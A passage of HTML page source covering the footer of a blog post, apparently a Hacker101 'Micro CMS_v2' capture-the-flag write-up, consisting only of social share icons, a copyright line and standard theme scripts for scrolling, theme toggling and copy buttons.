10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Hacker101 - Micro CMS_v2 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fd0rksec.github.io%2fwriteups%2fh101%2fmicro-cms_v2%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Hacker101 - Micro CMS_v2 on whatsapp" href="https://api.whatsapp.com/send?text=Hacker101%20-%20Micro%20CMS_v2%20-%20https%3a%2f%2fd0rksec.github.io%2fwriteups%2fh101%2fmicro-cms_v2%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Hacker101 - Micro CMS_v2 on telegram" href="https://telegram.me/share/url?text=Hacker101%20-%20Micro%20CMS_v2&url=https%3a%2f%2fd0rksec.github.io%2fwriteups%2fh101%2fmicro-cms_v2%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://d0rksec.github.io/>d0rksec</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>